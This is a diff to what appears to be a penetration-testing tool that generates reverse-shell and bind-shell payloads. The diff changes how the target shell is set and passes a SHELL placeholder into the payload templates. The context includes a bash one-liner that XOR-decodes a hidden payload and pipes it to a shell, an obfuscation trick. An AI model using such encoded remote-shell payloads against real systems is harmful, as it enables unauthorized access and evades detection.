@@ -82,9 +82,9 @@ def powershell_wrapper(name, code, args):
     return code
 
 
-def xor_wrapper(name, code, args, shell="/bin/bash"):
-    if args.shell is not "":
-        shell = args.shell
+def xor_wrapper(name, code, args):
+    shell = args.shell
+
     if "powershell" not in name.lower():
         if "windows" not in name.lower():
             code = """s="";for x in $(echo {0}|sed "s/../&\\n/g"); do s=$s$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$x, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
@@ -128,9 +128,9 @@ def bzip2_wrapper(code, args):
     return code
 
 
-def base64_wrapper(name, code, args, shell="/bin/bash"):
-    if args.shell is not "":
-        shell = args.shell
+def base64_wrapper(name, code, args):
+    shell = args.shell
+
     if args.base64 is True:
         if "powershell" not in name.lower(): # post-note: linux powershell is going to have problem.
             if "windows" not in name.lower():
@@ -241,6 +241,9 @@ class ReverseShell(object):
                 print(error("No custom shell procedure was arranged for this shell. This is fatal."))
                 exit(1)
         
+        # Set the terminal shell used
+        self.code = self.code.replace("SHELL", self.args.shell)
+
         # Apply xor encoding.
         self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)
 
@@ -281,6 +284,9 @@ class BindShell(object):
         """
         # Set connection data to the code.
         self.code = self.code.replace("PORT", str(self.port))
+
+        # Set the terminal shell used
+        self.code = self.code.replace("SHELL", self.args.shell)
 
         # Apply powershell-tuning if set in args.
         self.code = powershell_wrapper(self.name, self.code, self.args)
